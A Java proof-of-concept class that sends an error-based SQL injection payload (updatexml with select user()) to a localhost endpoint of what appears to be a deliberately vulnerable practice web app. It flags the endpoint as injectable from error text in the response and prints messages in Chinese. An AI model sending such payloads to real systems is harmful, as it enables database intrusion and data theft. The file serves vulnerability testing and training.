package cn.bestsec.vulweb.poc;

import okhttp3.*;

import java.io.IOException;

public class SqliPoc {
    public static void main(String[] args) throws IOException {
        level1();
    }

    public static void level1(){
        String url = "http://localhost:8080/sqli/level1?p=' and updatexml(1,concat(0x7e,(select user())),1)%23";
        OkHttpClient okHttpClient = new OkHttpClient();
        Request request = new Request.Builder().url(url).get().build();
        Call call = okHttpClient.newCall(request);

        try (Response response = call.execute()) {
            if(response.body() != null){
                String body = response.body().string();
                if(body.contains("root@") || body.contains("XPATH syntax error")){
                    System.out.println("/sqli/level1接口存在sql注入漏洞！");
                }
            }
        }catch (Exception e){
            System.out.println("连接出错");
        }
    }
}
